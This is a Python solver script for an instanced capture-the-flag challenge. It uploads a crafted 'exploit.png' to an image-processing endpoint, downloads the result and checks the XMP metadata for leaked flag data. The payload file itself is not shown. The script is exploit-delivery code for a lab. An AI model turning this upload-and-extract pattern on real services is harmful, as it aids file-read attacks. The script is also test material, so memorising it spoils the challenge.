#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
import re
import os
import time
import requests
from pwn import *


def check_flag(data):
    with open("/app/flag.png", "rb") as f:
        flag = f.read()
        if flag == data[:len(flag)]:
            return True
    with open("/app/flag-fake.png", "rb") as f:
        flag = f.read()
        if flag == data[:len(flag)]:
            return True

    return False


protocol = os.environ.get("PROTOCOL", "http")
domain = os.environ.get("DOMAIN", "http")
host = os.environ.get("HOST", "localhost")

port = int(os.environ.get("PORT", "1337"))

def get_subdomain_from_instance():
    io = connect(host, port)

    recvd = io.recvuntil(b"start a new instance\n", timeout=3)
    if recvd is None or recvd == b"":
        print("Not an instanced container!")
        raise ValueError("Not an instanced container!")

    io.sendline()
    data = io.recvuntil(b"Wait some time").decode()
    res_ins = re.search("\[\+\] http.*\/\/([a-zA-Z:\/\.\d]*)", data)
    res = re.search("\[\+\] (http[a-zA-Z:\/\.\d]*)", data)
    return res[1].strip(), res_ins[1].strip()


try:
    url, instance_url = get_subdomain_from_instance()
    print(f"[+] Created new instance: {instance_url}")
    print("[+] Waiting 5 seconds until instance is up")
    time.sleep(5)
except:
    subdomain = "" 
    url = f"{protocol}://{host}:{port}"
    instance_url = f"{host}:{port}"
    print(f"[+] URL: {url}")

print("[+] Waiting 5 seconds until instance is up")
time.sleep(5)


print("[+] Running exploit")

if url.endswith(".localhost:8080"):
    url = "http://127.0.0.1:8080" # python requests doesn't resolve localhost subdomains

files = {
    "file": open("/app/exploit.png", "rb")
}
values = {
    "job_id": os.environ.get("TICKET_NAME", "foobar")
}

print(files)
print(values)

res = requests.post(f"{url}/process", headers={"Host": instance_url}, files=files, data=values, allow_redirects=True) # Headers is required for testing locally

print(res)
if res.status_code == 200:
    body = res.content.decode()
    #print(body)

    imgpath = re.search('<img src="([^"]+)"\\s*>', body)
    if imgpath:
        imgpath = imgpath.group(1)
        print(imgpath)

        # Download file
        res = requests.get(f"{url}/{imgpath}", headers={"Host": instance_url})

        if res.status_code == 200:
            out = subprocess.check_output(["exiftool", "-b", "-xmp", "-"], input=res.content)


            if check_flag(out):
                print("[+] Flag found!!!", flush=True)
                exit(0)
            else:
                import base64
                print("XMP:", base64.b64encode(out))


print("[+] Flag could not be found", flush=True)
exit(255)
